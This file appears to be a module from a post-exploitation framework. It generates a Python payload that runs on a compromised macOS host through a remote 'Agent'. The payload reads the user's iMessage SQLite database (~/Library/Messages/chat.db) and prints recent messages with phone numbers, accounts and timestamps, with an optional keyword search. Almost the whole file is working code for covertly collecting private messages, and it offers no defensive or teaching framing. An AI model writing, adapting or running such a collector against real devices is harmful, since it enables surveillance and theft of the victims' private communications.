class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'iMessageDump',
            'Author': ['Alex Rymdeko-Harvey', '@Killswitch-GUI'],
            'Description': 'This module will enumerate the entire chat and IMessage SQL Database.',
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'RunOnDisk' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                'Using SQLite3 iMessage has a decent standard to correlate users to messages and isnt encrypted.'
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Messages' : {
                'Description'   :   'The number of messages to enumerate from most recent.',
                'Required'      :   True,
                'Value'         :   '10'
            },
            'Search' : {
                'Description'   :   'Enable a find keyword to search for within the iMessage Database.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Debug' : {
                'Description'   :   'Enable a find keyword to search for within the iMessage Database.',
                'Required'      :   True,
                'Value'         :   'False'
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        count = self.options['Messages']['Value']
        script = "count = " + str(count) + '\n'
        if self.options['Debug']['Value']:
            debug = self.options['Debug']['Value']
            script += "debug = " + str(debug) + '\n'
        if self.options['Search']['Value']:
            search = self.options['Search']['Value']
            script += 'searchPhrase = "' + str(search) + '"\n'
        script += """
try:
    if searchPhrase:
        searchMessage = True
except:
    searchMessage = False
    searchPhrase = ""
try:
    class imessage_dump():
        def __init__(self):
            try:
                print "[*] Message Enumeration Started!"
            except Exception as e:
                print e
        def func(self, count, searchMessage, debug, searchPhrase):
            try:
                import sqlite3
                from os.path import expanduser
                home = expanduser("~") + '/Library/Messages/chat.db'
                conn = sqlite3.connect(home)
                cur = conn.cursor()
                cur.execute("SELECT date,text,service,account,ROWID FROM message;")
                statment = cur.fetchall()
                cur.execute("SELECT ROWID,id,country,service FROM handle")
                handle = cur.fetchall()
                cur.execute("SELECT chat_id,message_id FROM chat_message_join")
                messageLink = cur.fetchall()
                dictList = []
                count = count * -1
                for item in statment[count:]:
                    try:
                        for messageid in messageLink:
                            if str(messageid[1]) == str(item[4]):
                                chatid =  messageid[0]
                                for rowid in handle:
                                    if str(rowid[0]) == str(chatid):
                                        if rowid[1]:
                                            Number = str(rowid[1])
                                        if rowid[2]:
                                            Country = str(rowid[2])
                                        if rowid[3]:
                                            Type = str(rowid[3])
                        epoch = self.TimeConv(item[0], debug)
                        line = {}
                        try:
                            if item[4]:
                                line['ROWID'] = str(item[4])
                            if item[2]:
                                line['Service'] = str(item[2])
                            if item[3]:
                                line['Account'] = str(item[3])
                            if epoch:
                                line['Date'] = str(epoch)
                            if Number:
                                line['Number'] = str(Number)
                            if Country:
                                line['Country'] = str(Country)
                            if Type:
                                line['Type'] = str(Type)
                            if item[1]:
                                line['Message'] = str(self.RemoveUnicode(item[1]))
                        except Exception as e:
                            if debug:
                                print " [Debug] Issues with object creation (line 55): " + str(e)
                        dictList.append(line)
                    except Exception as e:
                        if debug:
                            print " [Debug] Isssue at object creation (line 40): " + str(e)
                        pass
                conn.close()
                x = 0
                for dic in dictList:
                    try:
                        if searchMessage:
                            try:
                                if dic['Message']:
                                    Msg = dic['Message'].lower()
                                    if Msg.find(searchPhrase.lower()) != -1:
                                        for key in dic.keys():
                                            print " %s : %s" %(key, dic[key])
                                        x += 1
                                        print ''
                            except Exception as e:
                                if debug:
                                    print " [Debug] At Decode of Dict item for Message search (line 180): " + str(e)
                                pass
                        else:
                            for key in dic.keys():
                                try:
                                    print " %s : %s" %(key, dic[key])
                                except Exception as e:
                                    if debug:
                                        print " [Debug] At Decode of Dict item (line 180): " + str(e)
                                    pass
                            print ''
                    except Exception as e:
                        print "[!] Issue Decoding Dict Item: " + str(e)
                if searchMessage:
                    print "[!] Messages Matching Phrase: " + str(x)
                print "[!] Messages in DataStore: " + str(len(statment))
                count = count * -1
                print "[!] Messages Enumerated: " + str(count)
            except Exception as e:
                print e
        def TimeConv(self, epoch, debug):
            import datetime
            try:
                d = datetime.datetime.strptime("01-01-2001", "%m-%d-%Y")
                time = (d + datetime.timedelta(seconds=epoch)).strftime("%a, %d %b %Y %H:%M:%S GMT")
                return time
            except Exception as e:
                if debug:
                    print " [Debug] Issues Decoding epoch time: " + str(e)
        def RemoveUnicode(self, string):
                import re
                try:
                    string_data = string
                    if string_data is None:
                        return string_data
                    if isinstance(string_data, str):
                        string_data = str(string_data.decode('ascii', 'ignore'))
                    else:
                        string_data = string_data.encode('ascii', 'ignore')
                    remove_ctrl_chars_regex = re.compile(r'[^\x20-\x7e]')
                    CleanString = remove_ctrl_chars_regex.sub('', string_data)
                    return CleanString
                except Exception as e:
                    p = '[!] UTF8 Decoding issues Matching: ' + str(e)
                    print p
    im = imessage_dump()
    im.func(count, searchMessage, debug, searchPhrase)
except Exception as e:
    print e"""
        return script